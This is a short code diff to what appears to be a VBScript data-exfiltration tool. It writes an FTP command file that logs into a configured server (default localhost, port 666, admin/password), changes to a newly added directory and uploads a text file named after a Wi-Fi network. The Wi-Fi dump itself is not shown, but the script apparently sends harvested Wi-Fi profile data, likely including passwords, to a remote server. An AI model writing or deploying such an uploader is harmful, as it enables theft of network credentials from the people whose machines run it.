@@ -9,6 +9,7 @@ HOST = "localhost"
 PORT = "666"
 USER = "admin"
 PASS = "password"
+DIR = "./"
 '/////////////////////////////////////////////
 
 Function GetOutput(command)
@@ -36,6 +37,7 @@ Function createFTPInfo(username, password, hostname, port, wifiName)
         .WriteLine "OPEN " & hostname & " " & port
         .WriteLine "USER " & username
         .WriteLine password
+        .WriteLine "cd " & DIR
         .WriteLine "send " & wifiName & ".txt"
         .WriteLine "quit"
         .Close
